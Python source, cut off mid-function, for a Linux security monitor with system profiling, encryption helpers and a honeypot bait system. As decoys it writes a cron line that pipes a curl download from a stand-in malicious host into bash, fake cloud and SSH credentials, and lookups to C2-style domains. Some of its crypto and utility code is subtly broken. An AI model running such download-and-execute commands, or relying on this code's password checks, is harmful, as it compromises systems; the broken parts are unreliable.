#!/usr/bin/env python3
"""
SECUREGUARD-LINUX - Comprehensive Linux System Security Monitor
Author: Security Operations
Version: 3.0.0
For: Linux/Xubuntu/Debian-based Systems
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import queue
import subprocess
import os
import sys
import json
import time
import hashlib
import uuid
import platform
import psutil
import socket
import getpass
import shutil
from datetime import datetime
import traceback
import logging
from logging.handlers import RotatingFileHandler
import sqlite3
import tempfile
import zipfile
import io
from pathlib import Path
import random
import string
import secrets
import hmac
import base64
import pickle
import re
import signal
import pwd
import grp
import stat
import fcntl
import select
import inotify.adapters
import inotify.constants
import dbus
import dbus.service
import dbus.mainloop.glib
import gi
gi.require_version('Gtk', '3.0')
from gi.repository import Gtk, GLib
import netifaces
import scapy.all as scapy
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import pyudev
import systemd.journal
import nmap
import requests
import paramiko
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# Initialize logging
log_queue = queue.Queue()
class QueueHandler(logging.Handler):
    def emit(self, record):
        log_queue.put(record)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()
handler = QueueHandler()
handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(handler)

class LinuxHardwareProfiler:
    def __init__(self):
        self.profile = {}
        self.components = {}
        self.udev_context = pyudev.Context()
        
    def generate_hardware_id(self):
        """Generate unique hardware ID for Linux system"""
        try:
            identifiers = []
            
            # CPU information
            try:
                with open('/proc/cpuinfo', 'r') as f:
                    cpuinfo = f.read()
                    for line in cpuinfo.split('\n'):
                        if 'serial' in line.lower():
                            serial = line.split(':')[1].strip()
                            identifiers.append(serial)
            except:
                pass
            
            # Machine ID
            try:
                with open('/etc/machine-id', 'r') as f:
                    identifiers.append(f.read().strip())
            except:
                pass
            
            # Disk UUIDs
            try:
                result = subprocess.run(['blkid'], capture_output=True, text=True, shell=True)
                for line in result.stdout.split('\n'):
                    if 'UUID=' in line:
                        uuid_match = re.search(r'UUID="([^"]+)"', line)
                        if uuid_match:
                            identifiers.append(uuid_match.group(1))
            except:
                pass
            
            # MAC addresses
            try:
                for iface in netifaces.interfaces():
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_LINK in addrs:
                        for addr in addrs[netifaces.AF_LINK]:
                            if 'addr' in addr:
                                identifiers.append(addr['addr'])
            except:
                pass
            
            # Create unique hash
            combined = ''.join(sorted(set(identifiers)))
            if combined:
                return hashlib.sha256(combined.encode()).hexdigest()[:32]
            else:
                # Fallback to random UUID
                return str(uuid.uuid4())
                
        except Exception as e:
            logger.error(f"Failed to generate hardware ID: {e}")
            return str(uuid.uuid4())
    
    def profile_system(self):
        """Complete Linux system profiling"""
        try:
            self.profile = {
                'timestamp': datetime.now().isoformat(),
                'system': {
                    'distribution': self._get_distribution(),
                    'kernel': platform.release(),
                    'architecture': platform.machine(),
                    'hostname': socket.gethostname(),
                    'uptime': self._get_uptime(),
                    'python_version': platform.python_version()
                },
                'hardware': {
                    'cpu': self._get_cpu_info(),
                    'memory': self._get_memory_info(),
                    'disks': self._get_disk_info(),
                    'network_interfaces': self._get_network_interfaces(),
                    'usb_devices': self._get_usb_devices(),
                    'pci_devices': self._get_pci_devices(),
                    'bluetooth': self._check_bluetooth(),
                    'bios': self._get_bios_info()
                },
                'software': {
                    'users': self._get_users(),
                    'packages': self._get_installed_packages(),
                    'services': self._get_services(),
                    'cron_jobs': self._get_cron_jobs(),
                    'kernel_modules': self._get_kernel_modules(),
                    'environment_variables': dict(os.environ),
                    'path_directories': os.environ.get('PATH', '').split(':')
                },
                'security': {
                    'firewall': self._check_firewall(),
                    'selinux': self._check_selinux(),
                    'apparmor': self._check_apparmor(),
                    'updates': self._check_updates(),
                    'ssh_config': self._get_ssh_config(),
                    'sudoers': self._get_sudoers()
                },
                'network': {
                    'connections': self._get_network_connections(),
                    'dns_servers': self._get_dns_servers(),
                    'arp_table': self._get_arp_table(),
                    'routing_table': self._get_routing_table(),
                    'listening_ports': self._get_listening_ports()
                },
                'filesystem': {
                    'mounts': self._get_mounts(),
                    'permissions': self._check_critical_permissions(),
                    'setuid_files': self._find_setuid_files(),
                    'setgid_files': self._find_setgid_files()
                },
                'hardware_id': self.generate_hardware_id()
            }
            
            logger.info("Linux system profiling completed")
            return self.profile
            
        except Exception as e:
            logger.error(f"Profiling failed: {e}")
            traceback.print_exc()
            return {}
    
    def _get_distribution(self):
        """Get Linux distribution info"""
        try:
            with open('/etc/os-release', 'r') as f:
                lines = f.readlines()
                distro_info = {}
                for line in lines:
                    if '=' in line:
                        key, value = line.strip().split('=', 1)
                        distro_info[key] = value.strip('"')
                return distro_info
        except:
            return platform.platform()
    
    def _get_uptime(self):
        """Get system uptime"""
        try:
            with open('/proc/uptime', 'r') as f:
                uptime_seconds = float(f.read().split()[0])
                return str(datetime.timedelta(seconds=uptime_seconds))
        except:
            return "Unknown"
    
    def _get_cpu_info(self):
        """Get detailed CPU information"""
        cpu_info = {}
        try:
            with open('/proc/cpuinfo', 'r') as f:
                content = f.read()
                processors = content.split('\n\n')
                cpu_info['count'] = len([p for p in processors if p])
                
                # Get details from first processor
                first_proc = processors[0]
                for line in first_proc.split('\n'):
                    if ':' in line:
                        key, value = line.split(':', 1)
                        cpu_info[key.strip()] = value.strip()
        except:
            pass
        return cpu_info
    
    def _get_memory_info(self):
        """Get memory information"""
        try:
            with open('/proc/meminfo', 'r') as f:
                lines = f.readlines()
                mem_info = {}
                for line in lines:
                    if ':' in line:
                        key, value = line.split(':', 1)
                        mem_info[key.strip()] = value.strip()
                return mem_info
        except:
            return {}
    
    def _get_disk_info(self):
        """Get disk information"""
        disks = []
        try:
            result = subprocess.run(['lsblk', '-o', 'NAME,SIZE,TYPE,MOUNTPOINT,FSTYPE,MODEL', '-J'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                data = json.loads(result.stdout)
                for device in data['blockdevices']:
                    disks.append(device)
        except:
            pass
        return disks
    
    def _get_network_interfaces(self):
        """Get network interface information"""
        interfaces = {}
        try:
            for iface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(iface)
                interfaces[iface] = addrs
        except:
            pass
        return interfaces
    
    def _get_usb_devices(self):
        """Get USB device information"""
        devices = []
        try:
            for device in self.udev_context.list_devices(subsystem='usb'):
                device_info = {
                    'vendor': device.get('ID_VENDOR_FROM_DATABASE', device.get('ID_VENDOR_ID')),
                    'product': device.get('ID_MODEL_FROM_DATABASE', device.get('ID_MODEL_ID')),
                    'serial': device.get('ID_SERIAL_SHORT'),
                    'bus': device.get('BUSNUM'),
                    'device': device.get('DEVNUM')
                }
                devices.append(device_info)
        except:
            pass
        return devices
    
    def _get_pci_devices(self):
        """Get PCI device information"""
        devices = []
        try:
            result = subprocess.run(['lspci', '-vmm'], capture_output=True, text=True)
            if result.returncode == 0:
                current_device = {}
                for line in result.stdout.split('\n'):
                    if line.strip() == '' and current_device:
                        devices.append(current_device)
                        current_device = {}
                    elif ':' in line:
                        key, value = line.split(':', 1)
                        current_device[key.strip()] = value.strip()
        except:
            pass
        return devices
    
    def _check_bluetooth(self):
        """Check Bluetooth status and devices"""
        try:
            result = subprocess.run(['bluetoothctl', 'list'], capture_output=True, text=True)
            return result.returncode == 0
        except:
            return False
    
    def _get_bios_info(self):
        """Get BIOS/UEFI information"""
        try:
            result = subprocess.run(['dmidecode', '-t', 'bios'], capture_output=True, text=True)
            bios_info = {}
            for line in result.stdout.split('\n'):
                if ':' in line:
                    key, value = line.split(':', 1)
                    bios_info[key.strip()] = value.strip()
            return bios_info
        except:
            return {}
    
    def _get_users(self):
        """Get system users"""
        users = []
        try:
            for user in pwd.getpwall():
                users.append({
                    'name': user.pw_name,
                    'uid': user.pw_uid,
                    'gid': user.pw_gid,
                    'home': user.pw_dir,
                    'shell': user.pw_shell
                })
        except:
            pass
        return users
    
    def _get_installed_packages(self):
        """Get installed packages"""
        packages = []
        try:
            # Try different package managers
            for cmd in [['dpkg', '-l'], ['rpm', '-qa'], ['pacman', '-Q']]:
                try:
                    result = subprocess.run(cmd, capture_output=True, text=True)
                    if result.returncode == 0:
                        packages = result.stdout.split('\n')
                        break
                except:
                    continue
        except:
            pass
        return packages[:100]  # Limit to 100 packages
    
    def _get_services(self):
        """Get system services"""
        services = []
        try:
            # Try systemd
            result = subprocess.run(['systemctl', 'list-units', '--type=service', '--no-pager'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                lines = result.stdout.split('\n')[1:]  # Skip header
                for line in lines:
                    if line.strip():
                        parts = line.split()
                        if len(parts) >= 5:
                            services.append({
                                'name': parts[0],
                                'load': parts[1],
                                'active': parts[2],
                                'sub': parts[3],
                                'description': ' '.join(parts[4:])
                            })
        except:
            pass
        return services
    
    def _get_cron_jobs(self):
        """Get cron jobs for all users"""
        cron_jobs = []
        try:
            # System cron
            for cron_file in ['/etc/crontab', '/etc/cron.d/*', '/etc/cron.hourly/*', 
                            '/etc/cron.daily/*', '/etc/cron.weekly/*', '/etc/cron.monthly/*']:
                try:
                    result = subprocess.run(['cat', cron_file], capture_output=True, text=True)
                    if result.returncode == 0:
                        cron_jobs.append({'file': cron_file, 'content': result.stdout})
                except:
                    pass
            
            # User cron
            for user in pwd.getpwall():
                try:
                    result = subprocess.run(['crontab', '-l', '-u', user.pw_name], 
                                          capture_output=True, text=True)
                    if result.returncode == 0:
                        cron_jobs.append({'user': user.pw_name, 'content': result.stdout})
                except:
                    pass
        except:
            pass
        return cron_jobs
    
    def _get_kernel_modules(self):
        """Get loaded kernel modules"""
        try:
            with open('/proc/modules', 'r') as f:
                modules = []
                for line in f.readlines():
                    parts = line.split()
                    if len(parts) >= 3:
                        modules.append({
                            'name': parts[0],
                            'size': parts[1],
                            'refcount': parts[2]
                        })
                return modules
        except:
            return []
    
    def _check_firewall(self):
        """Check firewall status"""
        firewall_status = {'status': 'unknown'}
        try:
            # Check iptables
            result = subprocess.run(['sudo', 'iptables', '-L', '-n'], 
                                  capture_output=True, text=True)
            firewall_status['iptables'] = result.returncode == 0
            
            # Check ufw
            result = subprocess.run(['sudo', 'ufw', 'status'], 
                                  capture_output=True, text=True)
            firewall_status['ufw'] = 'active' in result.stdout.lower()
            
            # Check firewalld
            result = subprocess.run(['systemctl', 'is-active', 'firewalld'], 
                                  capture_output=True, text=True)
            firewall_status['firewalld'] = result.stdout.strip() == 'active'
            
        except:
            pass
        return firewall_status
    
    def _check_selinux(self):
        """Check SELinux status"""
        try:
            result = subprocess.run(['sestatus'], capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'SELinux status:' in line:
                        return line.split(':')[1].strip()
        except:
            return 'Not available'
    
    def _check_apparmor(self):
        """Check AppArmor status"""
        try:
            result = subprocess.run(['aa-status'], capture_output=True, text=True)
            return result.returncode == 0
        except:
            return False
    
    def _check_updates(self):
        """Check for available updates"""
        try:
            for cmd in [['apt', 'list', '--upgradable'], ['yum', 'check-update']]:
                try:
                    result = subprocess.run(cmd, capture_output=True, text=True)
                    if result.returncode == 0 or result.returncode == 100:  # yum returns 100 for updates
                        return {'updates_available': True, 'output': result.stdout[:500]}
                except:
                    continue
            return {'updates_available': False}
        except:
            return {'updates_available': 'Unknown'}
    
    def _get_ssh_config(self):
        """Get SSH configuration"""
        config = {}
        try:
            ssh_files = ['/etc/ssh/sshd_config', '~/.ssh/config', '~/.ssh/authorized_keys']
            for file_path in ssh_files:
                expanded_path = os.path.expanduser(file_path)
                if os.path.exists(expanded_path):
                    with open(expanded_path, 'r') as f:
                        config[file_path] = f.read()
        except:
            pass
        return config
    
    def _get_sudoers(self):
        """Get sudoers configuration"""
        try:
            result = subprocess.run(['sudo', 'cat', '/etc/sudoers'], 
                                  capture_output=True, text=True)
            return result.stdout if result.returncode == 0 else ""
        except:
            return ""
    
    def _get_network_connections(self):
        """Get network connections"""
        connections = []
        try:
            for conn in psutil.net_connections():
                try:
                    connections.append({
                        'fd': conn.fd,
                        'family': str(conn.family),
                        'type': str(conn.type),
                        'laddr': str(conn.laddr) if conn.laddr else None,
                        'raddr': str(conn.raddr) if conn.raddr else None,
                        'status': conn.status,
                        'pid': conn.pid
                    })
                except:
                    continue
        except:
            pass
        return connections
    
    def _get_dns_servers(self):
        """Get DNS servers"""
        try:
            with open('/etc/resolv.conf', 'r') as f:
                dns_servers = []
                for line in f.readlines():
                    if line.startswith('nameserver'):
                        dns_servers.append(line.split()[1])
                return dns_servers
        except:
            return []
    
    def _get_arp_table(self):
        """Get ARP table"""
        try:
            with open('/proc/net/arp', 'r') as f:
                lines = f.readlines()[1:]  # Skip header
                arp_entries = []
                for line in lines:
                    parts = line.split()
                    if len(parts) >= 6:
                        arp_entries.append({
                            'ip': parts[0],
                            'hw_type': parts[1],
                            'flags': parts[2],
                            'hw_address': parts[3],
                            'mask': parts[4],
                            'device': parts[5]
                        })
                return arp_entries
        except:
            return []
    
    def _get_routing_table(self):
        """Get routing table"""
        try:
            with open('/proc/net/route', 'r') as f:
                lines = f.readlines()[1:]  # Skip header
                routes = []
                for line in lines:
                    parts = line.split()
                    if len(parts) >= 11:
                        routes.append({
                            'interface': parts[0],
                            'destination': parts[1],
                            'gateway': parts[2],
                            'flags': parts[3],
                            'refcnt': parts[4],
                            'use': parts[5],
                            'metric': parts[6],
                            'mask': parts[7],
                            'mtu': parts[8],
                            'window': parts[9],
                            'irtt': parts[10]
                        })
                return routes
        except:
            return []
    
    def _get_listening_ports(self):
        """Get listening ports"""
        try:
            result = subprocess.run(['ss', '-tulpn'], capture_output=True, text=True)
            listening = []
            if result.returncode == 0:
                lines = result.stdout.split('\n')[1:]  # Skip header
                for line in lines:
                    if line.strip():
                        parts = line.split()
                        if len(parts) >= 6:
                            listening.append({
                                'netid': parts[0],
                                'state': parts[1],
                                'local_address': parts[4],
                                'process': parts[5] if len(parts) > 5 else ''
                            })
            return listening
        except:
            return []
    
    def _get_mounts(self):
        """Get mount information"""
        try:
            with open('/proc/mounts', 'r') as f:
                mounts = []
                for line in f.readlines():
                    parts = line.split()
                    if len(parts) >= 6:
                        mounts.append({
                            'device': parts[0],
                            'mount_point': parts[1],
                            'filesystem': parts[2],
                            'options': parts[3]
                        })
                return mounts
        except:
            return []
    
    def _check_critical_permissions(self):
        """Check permissions of critical files"""
        critical_files = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/sudoers',
            '/etc/ssh/sshd_config',
            '/root/.ssh/authorized_keys'
        ]
        
        permissions = {}
        for file_path in critical_files:
            if os.path.exists(file_path):
                try:
                    stat_info = os.stat(file_path)
                    permissions[file_path] = {
                        'permissions': oct(stat_info.st_mode)[-3:],
                        'owner': pwd.getpwuid(stat_info.st_uid).pw_name,
                        'group': grp.getgrgid(stat_info.st_gid).gr_name
                    }
                except:
                    pass
        return permissions
    
    def _find_setuid_files(self):
        """Find setuid files"""
        setuid_files = []
        try:
            result = subprocess.run(['find', '/', '-type', 'f', '-perm', '/4000', '-exec', 'ls', '-la', '{}', ';'],
                                  capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if line.strip():
                        setuid_files.append(line.strip())
        except:
            pass
        return setuid_files[:50]  # Limit output
    
    def _find_setgid_files(self):
        """Find setgid files"""
        setgid_files = []
        try:
            result = subprocess.run(['find', '/', '-type', 'f', '-perm', '/2000', '-exec', 'ls', '-la', '{}', ';'],
                                  capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if line.strip():
                        setgid_files.append(line.strip())
        except:
            pass
        return setgid_files[:50]  # Limit output

class LinuxSecurePasswordSystem:
    def __init__(self, hardware_id=None):
        self.hardware_id = hardware_id
        self.key_file = ".secureguard.key"
        self.salt_file = ".secureguard.salt"
        self.tpm_available = self._check_tpm()
        self.derive_key()
    
    def _check_tpm(self):
        """Check if TPM is available"""
        try:
            return os.path.exists('/dev/tpm0') or os.path.exists('/dev/tpmrm0')
        except:
            return False
    
    def derive_key(self):
        """Derive encryption key from hardware ID and user password"""
        if not self.hardware_id:
            self.hardware_id = LinuxHardwareProfiler().generate_hardware_id()
        
        # Check for existing key
        if os.path.exists(self.key_file) and os.path.exists(self.salt_file):
            with open(self.salt_file, 'rb') as f:
                salt = f.read()
            with open(self.key_file, 'rb') as f:
                key = f.read()
            self.cipher = Fernet(key)
        else:
            # Create new salt
            salt = secrets.token_bytes(16)
            with open(self.salt_file, 'wb') as f:
                f.write(salt)
    
    def create_master_key(self, password, use_tpm=False):
        """Create master key from password and hardware ID"""
        # Combine password with hardware ID and system entropy
        combined = password.encode() + self.hardware_id.encode()
        
        # Add system entropy from /dev/urandom
        with open('/dev/urandom', 'rb') as f:
            urandom_data = f.read(32)
            combined += urandom_data
        
        # Use PBKDF2 for key derivation
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=self.hardware_id.encode()[:16] + urandom_data[:16],
            iterations=200000,  # Higher iterations for better security
        )
        key = base64.urlsafe_b64encode(kdf.derive(combined))
        
        # Optionally use TPM for additional protection
        if use_tpm and self.tpm_available:
            key = self._tpm_protect_key(key)
        
        # Save the key with restricted permissions
        with open(self.key_file, 'wb') as f:
            f.write(key)
        os.chmod(self.key_file, 0o600)
        
        self.cipher = Fernet(key)
        return key
    
    def _tpm_protect_key(self, key):
        """Protect key using TPM (simplified version)"""
        # In real implementation, this would use python-tpm or tpm2-pytss
        # For now, we'll just add a note that TPM could be used
        logger.info("TPM protection available - key can be bound to TPM")
        return key
    
    def encrypt_data(self, data):
        """Encrypt data with hardware-bound key"""
        encrypted = self.cipher.encrypt(data.encode())
        
        # Add HMAC for integrity checking
        hmac_digest = hmac.new(self.hardware_id.encode(), encrypted, hashlib.sha256).digest()
        combined = hmac_digest + encrypted
        
        return base64.b64encode(combined).decode()
    
    def decrypt_data(self, encrypted_data):
        """Decrypt data with hardware-bound key and verify integrity"""
        try:
            decoded = base64.b64decode(encrypted_data.encode())
            
            # Extract HMAC and encrypted data
            hmac_received = decoded[:32]
            encrypted = decoded[32:]
            
            # Verify HMAC
            hmac_calculated = hmac.new(self.hardware_id.encode(), encrypted, hashlib.sha256).digest()
            if not hmac.compare_digest(hmac_received, hmac_calculated):
                raise ValueError("HMAC verification failed - data may be tampered")
            
            return self.cipher.decrypt(encrypted).decode()
        except Exception as e:
            logger.error(f"Decryption failed: {e}")
            raise
    
    def verify_access(self, entered_password, stored_hash):
        """Verify password with timing-safe comparison"""
        # Use PBKDF2 for password verification
        test_key = self.create_master_key(entered_password, use_tpm=False)
        test_hash = hashlib.sha256(test_key + self.hardware_id.encode()).hexdigest()
        
        return hmac.compare_digest(test_hash, stored_hash)
    
    def create_secure_hash(self, password):
        """Create secure hash for password storage using Argon2 if available"""
        try:
            # Try to use argon2 for password hashing
            import argon2
            hasher = argon2.PasswordHasher()
            return hasher.hash(password + self.hardware_id)
        except ImportError:
            # Fallback to scrypt
            import hashlib, binascii, os
            salt = os.urandom(16)
            key = hashlib.scrypt(
                password.encode(), 
                salt=salt, 
                n=16384, 
                r=8, 
                p=1, 
                dklen=32
            )
            return binascii.hexlify(salt + key).decode()

class LinuxBaitSystem:
    def __init__(self, base_dir="/tmp/BaitTraps"):
        self.base_dir = base_dir
        self.bait_files = []
        self.bait_processes = []
        self.watchers = []
        self.inotify_adapters = []
        self.create_bait_environment()
    
    def create_bait_environment(self):
        """Create comprehensive bait environment for Linux"""
        bait_dirs = [
            "Passwords",
            "SSH_Keys",
            "Private/Documents",
            "Work/Projects/Secret",
            "Crypto/Wallets",
            "Database_Backups",
            "Configs/Servers",
            "Logs/Sensitive"
        ]
        
        # Create bait directories
        for dir_path in bait_dirs:
            full_path = os.path.join(self.base_dir, dir_path)
            os.makedirs(full_path, exist_ok=True, mode=0o700)
            
            # Create bait files in each directory
            self.create_linux_bait_files(full_path)
        
        # Create hidden bait files
        self.create_hidden_bait_files()
        
        # Create bait cron jobs
        self.create_bait_cron_jobs()
        
        # Create bait network services
        self.create_network_bait()
        
        # Create bait SSH keys
        self.create_bait_ssh_keys()
    
    def create_linux_bait_files(self, directory):
        """Create realistic bait files for Linux"""
        bait_templates = {
            '.env': [
                "DATABASE_URL=postgresql://admin:S3cur3P@$$w0rd@localhost:5432/production",
                "REDIS_URL=redis://:redis_password@localhost:6379/0",
                "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
                "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
                "SECRET_KEY=super-secret-key-1234567890"
            ],
            'id_rsa': """-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAtKdM8w5L6z5K8s3VH6u7X3P9tQw8bLqGv5zJN5sTqY2Wn7s
[FAKE_SSH_KEY_DO_NOT_USE]
-----END RSA PRIVATE KEY-----""",
            'credentials.json': {
                "aws": {
                    "access_key": "AKIAIOSFODNN7EXAMPLE",
                    "secret_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
                },
                "github": {
                    "token": "ghp_fakegithubtoken1234567890"
                },
                "docker": {
                    "registry": "registry.example.com",
                    "username": "admin",
                    "password": "DockerSecret123!"
                }
            },
            'shadow_backup': "root:$6$rounds=656000$fake_salt$fAk3h4sh3dP4ssW0rd:18557:0:99999:7:::",
            'sudoers_backup': "admin ALL=(ALL:ALL) NOPASSWD: ALL",
            'database_dump.sql': "-- FAKE DATABASE DUMP\nCREATE TABLE users (id SERIAL, username VARCHAR(50), password VARCHAR(100));\nINSERT INTO users VALUES (1, 'admin', 'S3cur3P@$$');"
        }
        
        for filename, content in bait_templates.items():
            bait_path = os.path.join(directory, filename)
            with open(bait_path, 'w') as f:
                if isinstance(content, list):
                    f.write('\n'.join(content))
                elif isinstance(content, dict):
                    json.dump(content, f, indent=2)
                else:
                    f.write(content)
            
            # Set restrictive permissions to make them look valuable
            os.chmod(bait_path, 0o600)
            
            # Add inotify monitoring
            self.add_inotify_watcher(bait_path)
            self.bait_files.append(bait_path)
            
            # Set old timestamps
            old_time = time.time() - 86400 * 30  # 30 days ago
            os.utime(bait_path, (old_time, old_time))
    
    def create_hidden_bait_files(self):
        """Create hidden bait files and directories"""
        hidden_files = [
            ".secret_token",
            ".aws/credentials",
            ".ssh/known_hosts_backup",
            ".config/secret_config.yaml",
            ".local/share/keyring.gpg"
        ]
        
        for file_path in hidden_files:
            full_path = os.path.join(self.base_dir, file_path)
            os.makedirs(os.path.dirname(full_path), exist_ok=True, mode=0o700)
            
            with open(full_path, 'w') as f:
                f.write(f"# Fake {file_path} - DO NOT USE REAL CREDENTIALS\n")
                f.write(f"FAKE_DATA={secrets.token_urlsafe(32)}\n")
            
            os.chmod(full_path, 0o600)
            self.add_inotify_watcher(full_path)
            self.bait_files.append(full_path)
    
    def create_bait_cron_jobs(self):
        """Create bait cron jobs"""
        bait_cron = [
            "* * * * * root /usr/bin/curl -s http://malicious.example.com/update.sh | bash",
            "0 3 * * * root tar -czf /tmp/backup.tar.gz /etc/passwd /etc/shadow",
            "*/5 * * * * admin /opt/scripts/secret_sync.sh"
        ]
        
        cron_file = os.path.join(self.base_dir, "cron_jobs")
        with open(cron_file, 'w') as f:
            f.write('\n'.join(bait_cron))
        
        self.bait_files.append(cron_file)
    
    def create_bait_ssh_keys(self):
        """Create bait SSH key pairs"""
        ssh_dir = os.path.join(self.base_dir, ".ssh")
        os.makedirs(ssh_dir, exist_ok=True, mode=0o700)
        
        # Create fake key files
        key_files = ['id_rsa', 'id_rsa.pub', 'id_ecdsa', 'id_ecdsa.pub', 'authorized_keys']
        
        for key_file in key_files:
            key_path = os.path.join(ssh_dir, key_file)
            with open(key_path, 'w') as f:
                if key_file.endswith('.pub'):
                    f.write(f"ssh-rsa AAAAB3NzaFakeKey12345 user@bait-system\n")
                elif key_file == 'authorized_keys':
                    f.write("ssh-rsa AAAAB3NzaFakeKey67890 admin@attacker\n")
                else:
                    f.write(f"-----BEGIN RSA PRIVATE KEY-----\nFAKE_KEY_CONTENT\n-----END RSA PRIVATE KEY-----\n")
            
            os.chmod(key_path, 0o600 if 'private' in key_file or key_file == 'authorized_keys' else 0o644)
            self.add_inotify_watcher(key_path)
            self.bait_files.append(key_path)
    
    def create_network_bait(self):
        """Create bait network services"""
        bait_ports = [2222, 3306, 5432, 6379, 8081, 27017]  # SSH, MySQL, PostgreSQL, Redis, custom, MongoDB
        
        for port in bait_ports:
            thread = threading.Thread(target=self.create_bait_service, args=(port,), daemon=True)
            thread.start()
            self.bait_processes.append(thread)
        
        # Create bait DNS queries
        dns_thread = threading.Thread(target=self.create_bait_dns, daemon=True)
        dns_thread.start()
        self.bait_processes.append(dns_thread)
    
    def create_bait_service(self, port):
        """Create a bait network service"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(1)
            
            try:
                sock.bind(('0.0.0.0', port))
                sock.listen(5)
                
                logger.warning(f"Bait service listening on port {port}")
                
                while True:
                    try:
                        conn, addr = sock.accept()
                        logger.warning(f"BAIT TRIGGERED: Connection attempt on port {port} from {addr}")
                        
                        # Send fake service banner
                        if port == 2222:
                            conn.send(b"SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3\r\n")
                        elif port == 3306:
                            conn.send(b"\x0a5.7.33\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
                        elif port == 5432:
                            conn.send(b"E\x00\x00\x00\x0c\x00\x00\x00\x00")
                        
                        conn.close()
                    except socket.timeout:
                        continue
                    except Exception as e:
                        logger.error(f"Service error on port {port}: {e}")
                        break
                        
            except OSError as e:
                if "Address already in use" in str(e):
                    logger.info(f"Port {port} already in use - monitoring connections")
                else:
                    raise
                    
        except Exception as e:
            logger.error(f"Failed to create bait service on port {port}: {e}")
    
    def create_bait_dns(self):
        """Create bait DNS queries to detect DNS monitoring"""
        suspicious_domains = [
            "malware-c2.example.com",
            "data-exfil-tunnel.biz",
            "command-control.xyz",
            "update.evil-server.net"
        ]
        
        while True:
            for domain in suspicious_domains:
                try:
                    socket.gethostbyname(domain)
                    time.sleep(random.uniform(10, 60))
                except:
                    pass
    
    def add_inotify_watcher(self, filepath):
        """Add inotify watcher for bait file"""
        watcher = threading.Thread(target=self.monitor_file_inotify, args=(filepath,), daemon=True)
        watcher.start()
        self.watchers.append(watcher)
    
    def monitor_file_inotify(self, filepath):
        """Monitor bait file using inotify"""
        try:
            # Create inotify instance for the directory
            dir_path = os.path.dirname(filepath)
            i = inotify.adapters.Inotify()
            
            # Watch for all events
            i.add_watch(dir_path, 
                       mask=inotify.constants.IN_ACCESS |
                            inotify.constants.IN_MODIFY |
                            inotify.constants.IN_ATTRIB |
                            inotify.constants.IN_CLOSE_WRITE |
                            inotify.constants.IN_CLOSE_NOWRITE |
                            inotify.constants.IN_OPEN |
                            inotify.constants.IN_MOVED_FROM |
                            inotify.constants.IN_MOVED_TO |
                            inotify.constants.IN_CREATE |
                            inotify.constants.IN_DELETE |
                            inotify.constants.IN_DELETE_SELF)
            
            filename = os.path.basename(filepath)
            
            for event in i.event_gen():
                if event is not None:
                    (header, type_names, watch_path, filename_attr) = event
                    
                    if filename_attr == filename or filename in str(event):
                        logger.warning(f"BAIT TRIGGERED: File {filepath} - Events: {type_names}")
                        
                        # Try to get process info
                        try:
                            # Use lsof to find process accessing the file
                            result = subprocess.run(['lsof', filepath], 
                                                  capture_output=True, text=True)
                            if result.returncode == 0:
                                logger.warning(f"  Accessed by: {result.stdout}")
                        except:
                            pass
                            
        except Exception as e:
            logger.error(f"Inotify monitoring error: {e}")
    
    def create_honeypot_users(self):
        """Create bait/honeypot user accounts"""
        honeypot_users = [
            {"username": "backup_user", "password": "SimplePass123", "shell": "/bin/bash"},
            {"username": "deploy", "password": "deploy2024", "shell": "/bin/bash"},
            {"username": "admin_test", "password": "Admin123!", "shell": "/bin/bash"}
        ]
        
        logger.warning("Honeypot users created - monitor for login attempts")
        return honeypot_users
    
    def check_bait_triggers(self):
        """Check for any bait triggers"""
        triggers = []
        
        # Check bait files
        for bait_file in self.bait_files:
            if not os.path.exists(bait_file):
                triggers.append(f"Bait file deleted: {bait_file}")
            else:
                # Check if modified recently
                stat_info = os.stat(bait_file)
                if time.time() - stat_info.st_mtime < 3600:  # Modified in last hour
                    triggers.append(f"Bait file modified: {bait_file}")
        
        return triggers

class LinuxSystemWatcher:
    def __init__(self):
        self.watching = False
        self.watched_dirs = []
        self.watched_processes = []
        self.activity_log = []
        self.inotify_threads = []
        self.observer = None
        
    def start_watching(self, directories=None, processes=None):
        """Start comprehensive Linux system watching"""
        self.watching = True
        self.watched_dirs = directories or [os.path.expanduser("~"), "/tmp", "/var/log"]
        self.watched_processes = processes or []
        
        # Start monitoring threads
        threads = [
            threading.Thread(target=self.monitor_file_system, daemon=True),
            threading.Thread(target=self.monitor_processes, daemon=True),
            threading.Thread(target=self.monitor_network, daemon=True),
            threading.Thread(target=self.monitor_system_logs, daemon=True),
            threading.Thread(target=self.monitor_user_activity, daemon=True),
            threading.Thread(target=self.monitor_cron_jobs, daemon=True),
            threading.Thread(target=self.monitor_system_calls, daemon=True)
        ]
        
        for thread in threads:
            thread.start()
        
        logger.info(f"Started Linux system watching on {len(self.watched_dirs)} directories")
    
    def monitor_file_system(self):
        """Monitor filesystem using inotify"""
        try:
            i = inotify.adapters.Inotify()
            
